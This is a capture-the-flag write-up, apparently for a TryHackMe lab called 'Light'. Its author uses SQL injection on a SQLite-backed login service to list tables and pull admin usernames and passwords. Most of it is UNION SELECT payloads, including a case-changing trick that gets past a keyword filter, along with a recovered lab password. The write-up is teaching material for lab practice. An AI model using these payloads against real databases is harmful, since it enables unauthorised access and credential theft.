Welcome to the Light database application!


I am working on a database application called Light! Would you like to try it out?

If so, the application is running on port 1337. You can connect to it using 

``` bash 
nc 10.10.76.236 1337
```

You can use the username smokey in order to get started.

Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.

Alright tho, we got a hint here let's use it immediately :

So we have a username and a password rn, let's see what is the next phase!

I'm gonna scan it with `nmap`

alright we have two open ports right now which are `22` and the given one `1337` 

At this point, I assumed the process would follow a familiar pattern: extract data from port `1337`, connect via SSH, and escalate privileges. However, this machine

presented unexpected obstacles, straying from the conventional route I had anticipated.  

After too many trials, I eventually identified two columns through trial and error then we got a `username` and a `password`.

that gave us a password which is : `tF8tj2o94WE4LKC`

so right now we don't know what is this password for but,

 After further testing, I discovered a working SQL injection payload:

 ```bash
 smokey' UNION SELECT name FROM sqlite_master WHERE type='table
 ```

but we have a problem here with the input validation, it checks for `Union` and `SELECT`

so it's gonna be

```bash
' Union Select name FROM sqlite_master WHERE type='table
```

The output was the first table in the sqlite_master schema, whichâ€™s the admintable.

```bash 
' Union Select username FROM admintable WHERE username LIKE '%
```

Got the username of the `admin` by using `'%` which matches all the records in the table.

```bash
' Union Select password FROM admintable WHERE username = 'TryHackMeAdmin
```

so, we have the admin's password right now.

just wanna make sure how many records has been saved for the admintable.

```bash
 ' Union Select COUNT(username) FROM admintable WHERE '1
```

![screenshot](/assets/img/Light/7.png)

```bash 
' Union Select username FROM admintable WHERE username != 'TryHackMeAdmin
```
 
 ![screenshot](/assets/img/Light/8.png)

 so by using the previous command we've got the second username which is `flag`, then we will use another query to get the password for this username.

```bash 
' Union Select password FROM admintable WHERE username = 'flag
```
